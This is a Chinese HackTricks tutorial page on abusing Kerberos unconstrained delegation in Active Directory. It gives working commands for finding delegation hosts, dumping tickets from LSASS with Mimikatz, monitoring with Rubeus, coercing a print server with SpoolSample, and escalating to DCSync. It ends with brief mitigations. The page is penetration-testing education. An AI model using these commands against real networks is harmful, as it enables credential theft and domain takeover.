# 无限委派

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**吗？ 或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord群**](https://discord.gg/hRep4RUj7f) 或 **电报群** 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>

## 无限委派

这是域管理员可以设置给域内任何**计算机**的功能。然后，每当**用户登录**到计算机时，该用户的**TGT副本**将被**发送到DC提供的TGS中并保存在LSASS中的内存中**。 因此，如果您在计算机上具有管理员权限，您将能够**转储票证并冒充用户**在任何计算机上。

因此，如果域管理员在启用了“无限委派”功能的计算机上登录，而您在该计算机上具有本地管理员权限，则您将能够转储票证并冒充域管理员（域提升）。

您可以通过检查[userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)属性是否包含[ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx)来**查找具有此属性的计算机对象**。 您可以使用LDAP过滤器‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’来执行此操作，这就是powerview所做的事情：

<pre class="language-bash"><code class="lang-bash"># 列出无限委派计算机
## Powerview
Get-NetComputer -Unconstrained #DCs总是出现但对于权限提升没有用
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># 使用Mimikatz导出票证
</strong>privilege::debug
sekurlsa::tickets /export #推荐的方法
kerberos::list /export #另一种方法

# 监视登录并导出新票证
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #每10秒检查新的TGTs</code></pre>

使用**Mimikatz**或**Rubeus**将管理员（或受害用户）的票证加载到内存中进行**传递票证攻击**。\
更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**有关无限委派的更多信息，请访问ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **强制认证**

如果攻击者能够**入侵允许“无限委派”的计算机**，他可以**欺骗**一个**打印服务器**自动登录到该计算机**在服务器的内存中保存一个TGT**。\
然后，攻击者可以执行**传递票证攻击**来冒充用户打印服务器计算机帐户。

要使打印服务器登录到任何计算机，您可以使用[**SpoolSample**](https://github.com/leechristensen/SpoolSample)：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
如果TGT来自域控制器，您可以执行**DCSync攻击**并从DC获取所有哈希。\
[**有关此攻击的更多信息，请查看ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**以下是尝试强制身份验证的其他方法：**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### 缓解

* 限制DA/Admin登录到特定服务
* 为特权帐户设置“帐户是敏感的，不能被委派”选项。
